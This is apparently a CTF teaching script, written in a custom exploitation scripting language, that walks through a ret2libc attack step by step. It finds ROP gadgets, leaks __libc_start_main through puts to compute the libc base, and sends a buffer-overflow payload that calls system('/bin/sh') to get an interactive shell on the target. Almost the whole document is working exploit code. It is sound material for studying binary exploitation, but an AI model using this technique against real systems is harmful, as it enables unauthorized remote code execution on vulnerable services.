# ret2libc exploitation pattern - most common in modern CTFs
# This demonstrates leaking libc, calculating base, and getting shell

let binary = "./vuln_binary"  # Compile from vuln.c in examples/
let host = "pwn.chal.ctf"     # Replace with actual CTF target
let port = 1337

# Step 1: Analyze binary for protections and gadgets
let elf = analyze(binary)
print("[*] Binary protections:")
print("    PIE:", elf["pie"])
print("    NX:", elf["nx"])
print("    Canary:", elf["canary"])

# Step 2: Find necessary gadgets and addresses
let plt_puts = elf["plt"]["puts"]
let got_puts = elf["got"]["puts"]
let got_libc_start = elf["got"]["__libc_start_main"]
let main_addr = elf["symbols"]["main"]

# Find ROP gadgets
let gadgets = quick_rop(binary)
let pop_rdi = find(gadgets, "pop rdi; ret")
let ret = find(gadgets, "ret")

print("[*] Found gadgets:")
print("    pop rdi; ret @", hex(pop_rdi))
print("    ret @", hex(ret))

# Step 3: Connect and leak libc address
let conn = connect(host, port)
print("[+] Connected to", host, ":", port)

# Build leak payload
let offset = 72  # Buffer to RIP
let leak_payload = cyclic(offset) + p64(pop_rdi) + p64(got_libc_start) + p64(plt_puts) + p64(main_addr)

send(conn, leak_payload)
let leaked = recv_until(conn, "\n")
let leak = u64(leaked)

print("[+] Leaked __libc_start_main:", hex(leak))

# Step 4: Calculate libc base and system/binsh dynamically
# Use Libc object to resolve addresses automatically
let libc_template = Libc("ubuntu20.04")
let libc_start_offset = libc_template["symbols"]["__libc_start_main"]
let libc_base = leak - libc_start_offset

# Create resolved Libc object with known base address
let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
let system = libc_resolved["symbols"]["system"]
let bin_sh = libc_resolved["strings"]["bin_sh"]

print("[+] Libc base:", hex(libc_base))
print("[+] system():", hex(system))
print("[+] /bin/sh:", hex(bin_sh))

# Step 5: Send final exploit
# Add extra ret for stack alignment if needed
let final_payload = cyclic(offset) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)

send(conn, final_payload)

print("[+] Exploit sent! Dropping to shell...")
interactive(conn)
